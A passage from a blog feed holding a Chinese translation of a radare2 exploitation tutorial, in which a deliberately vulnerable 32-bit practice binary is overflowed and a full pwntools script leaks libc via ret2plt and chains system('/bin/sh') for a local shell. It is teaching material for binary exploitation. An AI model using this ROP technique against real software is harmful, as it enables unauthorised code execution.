rel="noopener">https://www.cnblogs.com/p4nda/p/7992951.html</a><br><a href="https://github.com/HyperSine/pwnable.tw/blob/master/Alive%20Note/solve.py" target="_blank" rel="noopener">https://github.com/HyperSine/pwnable.tw/blob/master/Alive%20Note/solve.py</a><br><a href="https://n132.github.io/2019/02/23/2019-02-23-mno2/" target="_blank" rel="noopener">https://n132.github.io/2019/02/23/2019-02-23-mno2/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【译】Radare2之旅-Part2：Exploitation</title>
    <link href="/2019/02/23/%E3%80%90%E8%AF%91%E3%80%91Radare2%E4%B9%8B%E6%97%85-Part2%EF%BC%9AExploitation/"/>
    <url>/2019/02/23/%E3%80%90%E8%AF%91%E3%80%91Radare2%E4%B9%8B%E6%97%85-Part2%EF%BC%9AExploitation/</url>
    
    <content type="html"><![CDATA[<p>翻译自<a href="https://www.megabeets.net/a-journey-into-radare-2-part-2/" target="_blank" rel="noopener">Megabeets</a>。</p><a id="more"></a><h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>欢迎来到我们<code>radare2</code>之旅的第二部分！在这一部分，我们会涵盖<code>radare2</code>的更多部分，同时这次更注重于二进制漏洞挖掘。</p><p>相信大家都一定很期待这第二部分，之后的内容也一定会更快地分享给大家。如果你还没有阅读过这一系列的<a href="https://www.megabeets.net/a-journey-into-radare-2-part-1/" target="_blank" rel="noopener">第一部分</a>，我非常推荐你去读一读。第一部分记录了<code>radare2</code>的基础内容，同时也解释了很多我今天会用到的命令。</p><p>在这一部分，我们的目的是对一个简单的程序进行漏洞挖掘与利用。<code>radare2</code>有很多不同的功能可以帮我们对漏洞进行利用，例如保护技术、查找 ROP、生成随机序列、查看寄存器内容等等。你可以在本文末尾找到一份命令对应表。今天我会向你们展示这些强大的功能，同时我们用<code>radare2</code>来绕过在开启<code>ASLR</code>的系统上运行并且有<code>NX</code>保护的程序。我假设大家都已经掌握了以下的预备知识：</p><ul><li>汇编语言</li><li>程序保护技术（<code>NX</code>、<code>ASLR</code>）</li><li><a href="https://en.wikipedia.org/wiki/Call_stack" target="_blank" rel="noopener">栈帧结构</a></li><li><a href="https://en.wikipedia.org/wiki/Buffer_overflow" target="_blank" rel="noopener">缓冲区溢出</a></li><li><a href="https://en.wikipedia.org/wiki/Return-oriented_programming" target="_blank" rel="noopener">面向返回编程</a></li><li><a href="https://en.wikipedia.org/wiki/X86_calling_conventions" target="_blank" rel="noopener">x86 调用约定</a></li></ul><p>熟悉这些知识是很重要的一步，因为文章中我并不会细讲，甚至不会对其解释。</p><p><img src="https://www.megabeets.net/uploads/r2_part1_2.png" srcset="/img/loading.gif" alt></p><h1 id="更新radare2"><a href="#更新radare2" class="headerlink" title="更新radare2"></a>更新<code>radare2</code></h1><p>首先，我们将<code>radare2</code>更新至其 git 的最新版版：</p><pre><code class="shell">$ git clone https://github.com/radare/radare2.git # 如果你还没有克隆下来的话$ cd radare2$ ./sys/install.sh</code></pre><p>等待更新完成需要很长一段时间，在这期间不如看些视频放松一会儿。</p><h1 id="熟悉程序"><a href="#熟悉程序" class="headerlink" title="熟悉程序"></a>熟悉程序</h1><p>你可以在这里下载<a href="https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%202%20-%20Exploitation/megabeets_0x2" target="_blank" rel="noopener">程序</a>，在这里下载<a href="https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%202%20-%20Exploitation/megabeets_0x2.c" target="_blank" rel="noopener">源码</a>。<br>如果你想自己编译程序，用以下命令：</p><pre><code class="shell">$ gcc -m32  -fno-stack-protector megabeets_0x2.c -o megabeets_0x2</code></pre><p>这次的程序与上一次的程序非常相似，只是在<code>main()</code>函数中有一些细微的改变：</p><ul><li>编译时不使用参数<code>-z execstac</code>来开启<code>NX</code></li><li>通过 scanf 来接收用户的输入，而不是通过程序的参数</li><li>大部分输出的函数为 puts</li><li>对程序的输出做了一点修改</li></ul><p>这是之前的<code>main()</code>函数：</p><pre><code class="cpp">int main(int argc, char *argv[]){    printf(&quot;\n  .:: Megabeets ::.\n&quot;);    printf(&quot;Think you can make it?\n&quot;);    if (argc &gt;= 2 &amp;&amp; beet(argv[1]))    {        printf(&quot;Success!\n\n&quot;);    }    else        printf(&quot;Nop, Wrong argument.\n\n&quot;);    return 0;}</code></pre><p>然后现在的<code>main</code>函数是这样的：</p><pre><code class="cpp">int main(int argc, char *argv[]){    char *input;    puts(&quot;\n  .:: Megabeets ::.\n&quot;);    puts(&quot;Show me what you got:&quot;);    scanf(&quot;%ms&quot;, &amp;input);    if (beet(input))    {        printf(&quot;Success!\n\n&quot;);    }    else        puts(&quot;Nop, Wrong argument.\n\n&quot;);    return 0;}</code></pre><p>程序的功能十分简单，并且在前一篇文章中我们已经对它很熟悉了——要求输入字符串，与经过<code>rot13</code>加密的字符串<code>Megabeets</code>比较。故输入应该为<code>Zrtnorrgf</code>。</p><pre><code class="shell">$ ./megabeets_0x2  .:: Megabeets ::.Show me what you got:blablablablaNop, Wrong argument.$ ./megabeets_0x2  .:: Megabeets ::.Show me what you got:ZrtnorrgfSuccess!</code></pre><p>这些都很简单，但是我们今天的重点并不是破解一个简单的 crackme，而是对其进行漏洞利用。那我们开始吧！</p><h1 id="理解漏洞"><a href="#理解漏洞" class="headerlink" title="理解漏洞"></a>理解漏洞</h1><p>对于每一个 PWN 题给出的程序来说，检查程序开了什么保护是一个好习惯。我们可以使用上一篇文章中提到的<code>rabin2</code>，或者直接在<code>radare2</code>的 shell 里执行<code>i</code>命令。因为我们还没有用<code>radare2</code>打开文件，就先用<code>rabin2</code>来看看：</p><pre><code class="shell">$ rabin2 -I megabeets_0x2arch     x86binsz    6072bintype  elfbits     32canary   falseclass    ELF32crypto   falseendian   littlehavecode trueintrp    /lib/ld-linux.so.2lang     clinenum  truelsyms    truemachine  Intel 80386maxopsz  16minopsz  1nx       trueos       linuxpcalign  0pic      falserelocs   truerelro    partialrpath    NONEstatic   falsestripped falsesubsys   linuxva       true</code></pre><p>在标记的几行中，我们可以看到程序开了<code>NX</code>，也就是说栈是不可执行的。还有，该程序没有开启<a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries" target="_blank" rel="noopener"><code>Canary</code></a>、<a href="https://en.wikipedia.org/wiki/Position-independent_code" target="_blank" rel="noopener"><code>PIC</code></a>或是<a href="https://tk-blog.blogspot.co.il/2009/02/relro-not-so-well-known-memory.html" target="_blank" rel="noopener"><code>RELRO</code></a>。</p><p>现在我们迅速地过一遍程序的执行流，这次我们看一看它的反汇编代码（并不是每次漏洞挖掘都能有源码）。使用<code>radare2</code>的调试模式打开程序：</p><pre><code class="shell">$ r2 -d megabeets_0x2Process with PID 20859 started…= attach 20859 20859bin.baddr 0x08048000Using 0x8048000Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2asm.bits 32– Your endian swaps[0xf7782b30]&gt; aas</code></pre><blockquote><ul><li><code>-d</code> – 用调试模式打开</li><li><code>aas</code> – 分析函数、符号以及其他</li><li>注意：正如我在前一篇文章所提到的，开始时使用<code>aaa</code>分析是最推荐的方式，因为分析本来就是一个很复杂的过程。我在<a href="https://reverseengineering.stackexchange.com/a/16115/18698" target="_blank" rel="noopener">这篇回答</a>里写了更多——读一下也许会让你的理解更深。</li></ul></blockquote><p>现在我们继续执行程序，直到<code>main</code>函数。只要输入命令<code>dcu main</code>：</p><pre><code class="shell">[0xf7797b30]&gt; dcu?|Usage: dcu Continue until address| dcu address      Continue until address| dcu [..tail]     Continue until the range| dcu [from] [to]  Continue until the range[0xf7797b30]&gt; dcu mainContinue until 0x08048658 using 1 bpsizehit breakpoint at: 8048658</code></pre><blockquote><ul><li><code>dcu</code>代表<code>debug continue until</code></li></ul></blockquote><p>现在让我们输入<code>VV</code>进入图形模式。在第一部分解释过，你可以通过<code>p</code>和<code>P</code>切换视角，通过<code>k</code>/<code>j</code>/<code>h</code>/<code>l</code>分别向上/下/左/右移动，通过<code>g</code>和调用旁的字母跳转函数（例如<code>gd</code>）。</p><p>用<code>?</code>来列出所有在图形模式下的命令，同时别忘记<code>R</code>命令 😉</p><p><img src="https://www.megabeets.net/uploads/mainsym.png" srcset="/img/loading.gif" alt></p><p><code>main()</code>函数是程序要求我们输入的地方，并且它将输入传给<code>sym.beet</code>。通过<code>gc</code>我们跳转到处理我们输入的<code>beet()</code>函数：</p><p><img src="https://www.megabeets.net/uploads/beetsym.png" srcset="/img/loading.gif" alt></p><p>我们可以看到用户的输入<code>[arg_8h]</code>被复制给一个缓冲区（<code>[local_88h]</code>），然后就是我们在前一篇文章中所看到过的，字符串<code>Megabeets</code>用<code>rot13</code>加密了，所得结果与我们的输入做比较。我们之前了解过，我这里就不做深究。</p><p>你有看到什么可以的地方吗？我们的输入没有对长度做检查，然后直接复制到了缓冲区中。这意味着如果我们输入一串超过缓冲区大小的字符串，就能导致栈上的缓冲区溢出。至此，我们找到了漏洞。</p><h1 id="规划漏洞利用脚本"><a href="#规划漏洞利用脚本" class="headerlink" title="规划漏洞利用脚本"></a>规划漏洞利用脚本</h1><p>既然我们已经找到了有漏洞的函数，我们需要构造一个 payload 来利用它。我们的目标很明了，就是在系统上成功开一个 shell。首先，我们要确认确实有一个有漏洞的函数，然后我们需要找到一个我们的 payload 可以覆盖栈的偏移。</p><p><img src="https://www.megabeets.net/uploads/tumblr_m5vxpy8Cs41qfoh4t.gif" srcset="/img/loading.gif" alt></p><p>我们将会使用一个<code>radare2</code>框架中的工具，叫做<code>ragg2</code>。它能够为我们生成一段循环的<a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence" target="_blank" rel="noopener">德布鲁因序列</a>，用来检测覆盖缓冲区的确切的偏移大小。</p><pre><code class="shell">$ ragg2 -&lt;truncated&gt; -P [size]       prepend debruijn pattern&lt;truncated&gt; -r              show raw bytes instead of hexpairs&lt;truncated&gt;$ ragg2 -P 100 -rAAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh</code></pre><p>我们知道我们的程序通过输入流读取我们的输入，而不是从 shell 中读取我们的输入。故我们将会使用又一个来自<code>radare2</code>工具箱中的工具，<code>rarun2</code>。</p><blockquote><ul><li><p><code>rarun2</code>可以在不同环境、参数、执行权限、文件夹下运行程序，并且覆盖默认的文件描述符（例如<code>stdin</code>）</p></li><li><p>如果你需要在跑一个程序时使用很长的参数，它会起很大的作用。而且漏洞利用通常都会向输入流传一大堆数据。</p></li></ul></blockquote><p>我们需要做以下的三个步骤：</p><ul><li>使用<code>ragg2</code>将德布鲁因序列写入一个文件</li><li>新建一个<code>rarun2</code>配置文件，并且把前一个文件作为<code>stdin</code></li><li>让<code>radare2</code>来找到偏移</li></ul><pre><code class="shell">$ ragg2 -P 200 -r &gt; pattern.txt$ cat pattern.txtAAABAACAADAAEAAFAAGAAHAAI… &lt;truncated&gt; …7AA8AA9AA0ABBABCABDABEABFA$ vim profile.rr2$ cat profile.rr2#!/usr/bin/rarun2stdin=./pattern.txt$ r2 -r profile.rr2 -d megabeets_0x2Process with PID 21663 started…= attach 21663 21663bin.baddr 0x08048000Using 0x8048000Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2asm.bits 32— Use rarun2 to launch your programs with a predefined environment.[0xf77c2b30]&gt; dcSelecting and continuing: 21663.:: Megabeets ::.Show me what you got?child stopped with signal 11[0x41417641]&gt;</code></pre><p>我们运行程序，并将<em>pattern.txt</em>的内容用<code>rarun2</code>传给<code>stdin</code>，<em>SIGSEV 11</em>。</p><blockquote><ul><li><p>一个信号是一种发送给进程或是一个具体线程的异步通知，这样与之相同的进程就会在某个事件发生时得到提醒。</p></li><li><p>SIGSEGV（11）信号在访问了某个无效的虚拟内存或段错误后会触发。</p></li></ul></blockquote><p>你发现了吗？我们实时的指针现在指向了<code>0x41417641</code>。这是一个无效的地址，它表示了字符串<code>AvAA</code>（小端序及 ascii 码转换），也就是我们送的字符串的一部分。<code>radare2</code>允许我们找到给出的值在德布鲁因序列中的偏移。</p><pre><code class="shell">[0x41417641]&gt; wop?|Usage: wop[DO] len @ addr | value| wopD len [@ addr]  Write a De Bruijn Pattern of length ‘len’ at address ‘addr’| wopO value         Finds the given value into a De Bruijn Pattern at current offset[0x41417641]&gt; wopO `dr eip`140</code></pre><p>既然我们已经知道需要覆盖返回地址的偏移为 140，我们可以开始编写脚本了。</p><h1 id="编写漏洞利用脚本"><a href="#编写漏洞利用脚本" class="headerlink" title="编写漏洞利用脚本"></a>编写漏洞利用脚本</h1><p>我之前也提到过很多次，这篇文章不是教一些漏洞利用的基础知识的，它的目的是展示<code>radare2</code>在漏洞利用中是如何使用的。因此，我不会过多地解释脚本的每个部分。</p><p>我们的目标是在系统中产生一个 shell。这有很多种方法，尤其是这样一个程序。为了知道我们能做什么，首先我们需要知道我们不能做什么。我们的程序在开了<code>ASLR</code>地环境下，所以我们不能猜测到<a href="https://en.wikipedia.org/wiki/C_standard_library" target="_blank" rel="noopener"><em>libc</em></a>在内存中的地址。那就可以和<a href="https://en.wikipedia.org/wiki/Return-to-libc_attack" target="_blank" rel="noopener"><em>ret2libc</em></a>说再见了。另外，程序开了<code>NX</code>，这意味栈是不可执行的，所以我们不能直接在栈上放一个<a href="https://en.wikipedia.org/wiki/Shellcode" target="_blank" rel="noopener"><em>shellcode</em></a>然后跳过去。</p><p>虽然这些保护让我们不能使用一些漏洞利用技术，然而这不能阻止我们轻松地绕过它们。编写我们的脚本时，需要细心地观察提供给我们的运行库以及函数。</p><p>让我们再次通过调试模式打开程序，然后看一看它使用的运行库和函数。先看库：</p><pre><code class="shell">$ r2 -d megabeets_0x2Process with PID 23072 started…= attach 23072 23072bin.baddr 0x08048000Using 0x8048000Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2asm.bits 32— You haxor! Me jane?[0xf7763b30]&gt; il[Linked libraries]libc.so.61 library</code></pre><p><code>il</code>表示<code>Information libraries</code>，即告诉我们程序所使用的运行库。对于该程序来说，只有我们最爱的<em>libc</em>。</p><p>现在通过执行<code>ii</code>命令——<code>Information Imports</code>，让我们看看导入的函数。我们可以加上<code>q</code>来减少冗长的输出：</p><pre><code class="shell">[0xf7763b30]&gt; ii[Imports]ordinal=001 plt=0x08048370 bind=GLOBAL type=FUNC name=strcmpordinal=002 plt=0x08048380 bind=GLOBAL type=FUNC name=strcpyordinal=003 plt=0x08048390 bind=GLOBAL type=FUNC name=putsordinal=004 plt=0x00000000 bind=WEAK type=NOTYPE name=__gmon_start__ordinal=005 plt=0x080483a0 bind=GLOBAL type=FUNC name=__libc_start_mainordinal=006 plt=0x080483b0 bind=GLOBAL type=FUNC name=__isoc99_scanf6 imports[0xf7763b30]&gt; iiqstrcmpstrcpyputs__gmon_start____libc_start_main__isoc99_scanf</code></pre><h2 id="计划"><a href="#计划" class="headerlink" title="计划"></a>计划</h2><ul><li>泄漏<code>puts</code>的真实地址</li><li>计算<em>libc</em>的基址</li><li>计算<code>system</code>的地址</li><li>在<em>libc</em>中找到包含字符串<code>/bin/sh</code>的地址</li><li>调用<code>system(&quot;/bin/sh&quot;)</code>打开一个 shell</li></ul><h2 id="泄漏puts的地址"><a href="#泄漏puts的地址" class="headerlink" title="泄漏puts的地址"></a>泄漏<code>puts</code>的地址</h2><p>我们需要用到<code>ret2plt</code>来泄漏<code>puts</code>的真实地址。<code>PLT</code>（<em>Procedure Linkage Table</em>）是内存中的结构体，它包括一小段代码，能够跳转到在动态链接时程序之外的函数地址。不管什么时候，我们在<code>.text</code>段看到<code>CALL</code>指令，并不是直接跳到函数。实际上，它跳转到了<code>PLT</code>中的一小段代码，像是<code>func_name@plt</code>这样。这一小段代码跳转到<code>GOT</code>（<em>Global Offset Table</em>）中的列出的该函数的地址。<code>GOT</code>表入口点会指回<code>PLT</code>，同时<code>PLT</code>会调用一个动态链接器来确定该函数的真实地址。下一次调用<code>func_name@plt</code>时，这段代码会直接跳转到<code>GOT</code>表里的函数地址。想要了解更多关于动态链接的知识，我推荐伊恩兰斯泰勒写的<a href="https://www.airs.com/blog/archives/38" target="_blank" rel="noopener">这一系列关于链接器的文章</a></p><p>为了达到这个目的，我们需要找到<code>puts</code>在<code>PLT</code>以及<code>GOT</code>中的地址，然后调用<code>puts@plt</code>并且把<code>puts@got</code>作为参数。我们将把这些调用连在一起，在<code>scanf</code>时传给程序。然后我们会返回到我们利用的第二个阶段。<code>puts</code>将会把它真实的地址输出出来。</p><pre><code>+---------------------+|       Stage 1       |+---------------------+| padding (140 bytes) || puts@plt            || entry_point         || puts@got            |+---------------------+</code></pre><p>编写脚本我们需要使用<a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener"><em>pwnlib</em></a>框架，而且它是我最喜欢的 python 漏洞利用框架。他简化了很多东西，让利用更简便。当然你也可以使用其他你喜欢的方式。</p><p>使用<code>pip</code>下载<em>pwntools</em>：</p><pre><code class="shell">$ pip install --upgrade pip$ pip install --upgrade pwntools</code></pre><p>你可以在<a href="http://docs.pwntools.com/en/stable/index.html" target="_blank" rel="noopener">官方文档</a>上了解更多关于<em>pwntools</em>。</p><p>这是我们第一阶段的 python 脚本：</p><pre><code class="python">from pwn import *# Addressesputs_plt =puts_got =entry_point =# context.log_level = &quot;debug&quot;def main():    # open process    p = process(&quot;./megabeets_0x2&quot;)    # Stage 1    # Initial payload    payload  =  &quot;A&quot;*140 # padding    ropchain =  p32(puts_plt)    ropchain += p32(entry_point)    ropchain += p32(puts_got)    payload = payload + ropchain    p.clean()    p.sendline(payload)    # Take 4 bytes of the output    leak = p.recv(4)    leak = u32(leak)    log.info(&quot;puts is at: 0x%x&quot; % leak)    p.clean()if __name__ == &quot;__main__&quot;:    main()</code></pre><p>我们需要填充<code>puts@plt</code>和<code>puts@got</code>的地址，以及程序的入口点。让我们回到<code>radare2</code>并执行以下命令。字符<code>#</code>用于注释，字符<code>~</code>是<code>radare2</code>的 shell 中的内置<code>grep</code>。</p><pre><code class="shell">[0xf7763b30]&gt; # the address of puts@plt:[0xf7763b30]&gt; ?v sym.imp.puts0x08048390[0xf7763b30]&gt; # the address of puts@got:[0xf7763b30]&gt; ?v reloc.puts_200x0804a014[0xf7763b30]&gt; # the address of program’s entry point (entry0):[0xf7763b30]&gt; ieq0x080483d0</code></pre><p><code>sym.imp.puts</code>和<code>reloc.puts_20</code>是<code>radare2</code>自动检测到的标志。命令<code>ie</code>表示<code>Information Entrypoint</code>。</p><p>现在我们填入我们找到的地址：</p><pre><code class="python">...# Addressesputs_plt = 0x8048390puts_got = 0x804a014entry_point = 0x80483d0...</code></pre><p>我们执行一下脚本：</p><pre><code class="shell">$ python exploit.py[+] Starting local process ‘./megabeets_0x2’: pid 23578[*] puts is at: 0xf75db710[*] Stopped process ‘./megabeets_0x2’ (pid 23578)$ python exploit.py[+] Starting local process ‘./megabeets_0x2’: pid 23592[*] puts is at: 0xf7563710[*] Stopped process ‘./megabeets_0x2’ (pid 23592)$ python exploit.py[+] Starting local process ‘./megabeets_0x2’: pid 23606[*] puts is at: 0xf75e3710[*] Stopped process ‘./megabeets_0x2’ (pid 23606)</code></pre><p>我执行了脚本三次，<code>puts</code>的地址每次都会变得不一样。因此我们不能提前预测它的地址。现在我们需要找到<code>puts</code>在<em>libc</em>中的偏移，然后计算出<em>libc</em>的基址。在我们找到基址后，我们可以用偏移计算出<code>system</code>、<code>exit</code>以及字符串<code>/bin/sh</code>的地址。</p><p>现在我们的脚本应该是这样：</p><pre><code class="python">from pwn import *# Addressesputs_plt = 0x8048390puts_got = 0x804a014entry_point = 0x80483d0# Offsetsoffset_puts =offset_system =offset_str_bin_sh =offset_exit =# context.log_level = &quot;debug&quot;def main():    # open process    p = process(&quot;./megabeets_0x2&quot;)    # Stage 1    # Initial payload    payload  =  &quot;A&quot;*140    ropchain =  p32(puts_plt)    ropchain += p32(entry_point)    ropchain += p32(puts_got)    payload = payload + ropchain    p.clean()    p.sendline(payload)    # Take 4 bytes of the output    leak = p.recv(4)    leak = u32(leak)    log.info(&quot;puts is at: 0x%x&quot; % leak)    p.clean()    # Calculate libc base    libc_base = leak - offset_puts    log.info(&quot;libc base: 0x%x&quot; % libc_base)    # Stage 2    # Calculate offsets    system_addr = libc_base + offset_system    binsh_addr = libc_base + offset_str_bin_sh    exit_addr = libc_base  + offset_exit    log.info(&quot;system: 0x%x&quot; % system_addr)    log.info(&quot;binsh: 0x%x&quot; % binsh_addr)    log.info(&quot;exit: 0x%x&quot; % exit_addr)if __name__ == &quot;__main__&quot;:    main()</code></pre><h2 id="计算真实地址"><a href="#计算真实地址" class="headerlink" title="计算真实地址"></a>计算真实地址</h2><p><em>请注意在文章的这部分，我的结果可能与你的不同。因为我们的 libc 版本不同，所以会产生不同的偏移。</em></p><p>首先我们需要找到<code>puts</code>在<em>libc</em>上的偏移。我们再一次打开<code>radare2</code>，继续执行到入口点。做以上步骤的原因是我们在<em>libc</em>载入之前开始调试程序，直到入口点时，运行库才全部加载完。</p><p>我们使用<code>dmi</code>命令，将<em>libc</em>和函数作为参数。我加上了<code>~</code>来显示相关的信息。</p><pre><code class="shell">$ r2 -d megabeets_0x2Process with PID 24124 started…= attach 24124 24124bin.baddr 0x08048000Using 0x8048000Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2asm.bits 32— A C program is like a fast dance on a newly waxed dance floor by people carrying razors – Waldi Ravens[0xf771ab30]&gt; dcu entry0Continue until 0x080483d0 using 1 bpsizehit breakpoint at: 80483d0[0x080483d0]&gt; dmi libc puts~ puts$vaddr=0xf758f710 paddr=0x00062710 ord=6490 fwd=NONE sz=474 bind=GLOBAL type=FUNC name=puts[0x080483d0]&gt; dmi libc system~ system$vaddr=0xf7569060 paddr=0x0003c060 ord=6717 fwd=NONE sz=55 bind=WEAK type=FUNC name=system[0x080483d0]&gt; dmi libc exit~ exit$vaddr=0xf755c180 paddr=0x0002f180 ord=5904 fwd=NONE sz=33 bind=LOCAL type=FUNC name=exit</code></pre><p><em>请注意，在这篇文章发表前，<code>dmi</code>的输出格式就已经改变了。你的结果很有可能与我的有所不同。</em></p><p>所有这些<code>paddr=0x000xxxxx</code>是函数在<em>libc</em>上的偏移。现在我们需要在程序中找到<code>/bin/sh</code>的位置。我们将要使用<code>radare2</code>的一些搜索功能。<code>radare2</code>默认在<code>dbg.map</code>，也就是当前内存中查找。我们想要在所有内存中查找则需要设置成：</p><pre><code class="shell">[0x080483d0]&gt; e search.in = dbg.maps</code></pre><p>你可以执行<code>e search.in=?</code>查看更多选项。执行<code>Ve</code>配置可视化模式</p><p>在<code>radare2</code>中通过<code>/</code>命令查找。让我们看看<code>radare2</code>给我们提供的查找参数：</p><pre><code class="shell">|Usage: /[amx/] [arg]Search stuff (see ‘e??search’ for options)| / foo\x00           search for string ‘foo\0’| /j foo\x00          search for string ‘foo\0’ (json output)| /! ff               search for first occurrence not matching| /+ /bin/sh          construct the string with chunks| /!x 00              inverse hexa search (find first byte != 0x00)| //                  repeat last search| /h[t] [hash] [len]  find block matching this hash. See /#?| /a jmp eax          assemble opcode and search its bytes| /A jmp              find analyzed instructions of this type (/A? for help)| /b                  search backwards| /B                  search recognized RBin headers| /c jmp [esp]        search for asm code| /C[ar]              search for crypto materials| /d 101112           search for a deltified sequence of bytes| /e /E.F/i           match regular expression| /E esil-expr        offset matching given esil expressions %%= here| /f file [off] [sz]  search contents of file with offset and size| /i foo              search for string ‘foo’ ignoring case| /m magicfile        search for matching magic file (use blocksize)| /o                  show offset of previous instruction| /p patternsize      search for pattern of given size| /P patternsize      search similar blocks| /r[e] sym.printf    analyze opcode reference an offset (/re for esil)| /R [?] [grepopcode] search for matching ROP gadgets, semicolon-separated| /v[1248] value      look for an cfg.bigendian 32bit value| /V[1248] min max    look for an cfg.bigendian 32bit value in range| /w foo              search for wide string ‘f\0o\0o\0’| /wi foo             search for wide string ignoring case ‘f\0o\0o\0’| /x ff..33           search for hex string ignoring some nibbles| /x ff0033           search for hex string| /x ff43 ffd0        search for hexpair with mask| /z min max          search for strings of given size</code></pre><p>提供给我们了许多不同的方式。同时还发心<code>/R</code>能够帮助我们查找 ROP。可惜这篇文章里我们没有打算使用 ROP。但其他情况下，你们写利用脚本时一定很喜欢用它。</p><p>我们不需要任何花哨的东西，只用最简单的查找即可。在这之后，我们先找到当前<em>libc</em>载入的地址，然后计算出<code>/bin/sh</code>的偏移。</p><pre><code class="shell">[0x080483d0]&gt; / /bin/shSearching 7 bytes from 0x08048000 to 0xffd50000: 2f 62 69 6e 2f 73 68Searching 7 bytes in [0x8048000-0x8049000]hits: 0Searching 7 bytes in [0x8049000-0x804a000]hits: 0 &lt;..truncated..&gt; Searching 7 bytes in [0xf77aa000-0xf77ab000]hits: 0Searching 7 bytes in [0xffd2f000-0xffd50000]hits: 00xf7700768 hit1_0 .b/strtod_l.c-c/bin/shexit 0canonica.</code></pre><p><code>r2</code>在内存中找到了<code>/bin/sh</code>。现在我们计算它相对<em>libc</em>基址的偏移：</p><pre><code class="shell">[0x080483d0]&gt; dmm~libc0xf7599000 /usr/lib32/libc-2.25.so[0x080483d0]&gt; ?X 0xf7700768-0xf7599000167768</code></pre><p>我们发现<code>/bin/sh</code>相对<em>libc</em>基址的偏移为<code>0x167768</code>。我们把它填进脚本中，并且可以开始我们的最后一个步骤。</p><pre><code class="python">...# Offsetsoffset_puts = 0x00062710offset_system = 0x0003c060offset_exit = 0x0002f1b0offset_str_bin_sh = 0x167768...</code></pre><h2 id="获取-shell"><a href="#获取-shell" class="headerlink" title="获取 shell"></a>获取 shell</h2><p>漏洞利用的第二阶段很直接。我们继续使用 140 个字符，然后调用<code>system</code>并将<code>/bin/sh</code>作为参数，最后<code>exit</code>。</p><pre><code>+---------------------+|       Stage 2       |+---------------------+| padding (140 bytes) || system@libc         || exit@libc           || /bin/sh address     |+---------------------+</code></pre><p>还记得上一次我们返回到了入口点吗？这意味着<code>scanf</code>又在等待我们的输入。现在我们所做的就是把这些调用串联起来传给程序。</p><p>这是我们最后的脚本。像我之前所说的，你只需要替换符合你的<em>libc</em>的偏移。</p><pre><code class="python">from pwn import *# Addressesputs_plt = 0x8048390puts_got = 0x804a014entry_point = 0x80483d0# Offsetsoffset_puts = 0x00062710offset_system = 0x0003c060offset_exit = 0x0002f1b0offset_str_bin_sh = 0x167768# context.log_level = &quot;debug&quot;def main():    # open process    p = process(&quot;./megabeets_0x2&quot;)    # Stage 1    # Initial payload    payload  =  &quot;A&quot;*140    ropchain =  p32(puts_plt)    ropchain += p32(entry_point)    ropchain += p32(puts_got)    payload = payload + ropchain    p.clean()    p.sendline(payload)    # Take 4 bytes of the output    leak = p.recv(4)    leak = u32(leak)    log.info(&quot;puts is at: 0x%x&quot; % leak)    p.clean()    # Calculate libc base    libc_base = leak - offset_puts    log.info(&quot;libc base: 0x%x&quot; % libc_base)    # Stage 2    # Calculate offsets    system_addr = libc_base + offset_system    exit_addr = libc_base  + offset_exit    binsh_addr = libc_base + offset_str_bin_sh    log.info(&quot;system is at: 0x%x&quot; % system_addr)    log.info(&quot;/bin/sh is at: 0x%x&quot; % binsh_addr)    log.info(&quot;exit is at: 0x%x&quot; % exit_addr)    # Build 2nd payload    payload2  =  &quot;A&quot;*140    ropchain2 =  p32(system_addr)    ropchain2 += p32(exit_addr)    # Optional: Fix disallowed character by scanf by using p32(binsh_addr+5)    #           Then you&#39;ll execute system(&quot;sh&quot;)    ropchain2 += p32(binsh_addr)    payload2 = payload2 + ropchain2    p.sendline(payload2)    log.success(&quot;Here comes the shell!&quot;)    p.clean()    p.interactive()if __name__ == &quot;__main__&quot;:    main()</code></pre><p>跑这个脚本我们就能成功拿到一个 shell：</p><pre><code class="shell">$ python exploit.py[+] Starting local process ‘./megabeets_0x2’: pid 24410[*] puts is at: 0xf75db710[*] libc base: 0xf75ce000[*] system is at: 0xf760a060[*] /bin/sh is at: 0xf7735768[*] exit is at: 0xf75fd1b0[+] Here comes the shell![*] Switching to interactive mode:$ whoamibeet$ echo EOFEOF</code></pre><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><code>Radare2</code>之旅的第二部分就到此结束了。我们简单地学习了一些<code>radare2</code>中漏洞利用的功能。在下一部分中，我们会学习<code>radare2</code>再脚本编写和恶意软件分析中的功能。</p><h1 id="漏洞利用命令对应表"><a href="#漏洞利用命令对应表" class="headerlink" title="漏洞利用命令对应表"></a>漏洞利用命令对应表</h1><p>这是一系列我在本文中提到的命令（还有一些补充）。你可以把它作为一份参考表。</p><h2 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h2><ul><li><code>$ rabin2 -I ./program</code>——二进制信息（和<code>radare2</code>的 shell 中<code>i</code>命令相同）</li><li><code>ii [q]</code>——导入表</li><li><code>?v sym.imp.func_name</code>——获取<code>func_name@PLT</code>地址</li><li><code>?v reloc.func_name</code>——获取<code>func_name@GOT</code>地址</li><li><code>ie [q]</code>——获取入口点地址</li><li><code>iS</code>——查看区段的各个权限（读/写/执行）</li><li><code>i~canary</code>——检查是否开启<code>Canary</code></li><li><code>i~pic</code>——检查是否开启<code>PIE</code></li><li><code>i~nx</code>——检查是否开启<code>NX</code></li></ul><h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><ul><li><code>dm</code>——查看内存信息</li><li><code>dmm</code>——列出模块（内存中的运行库和二进制模块）</li><li><code>dmi [addr|libname] [symname]</code>——列出目标库的标志</li></ul><h2 id="查找"><a href="#查找" class="headerlink" 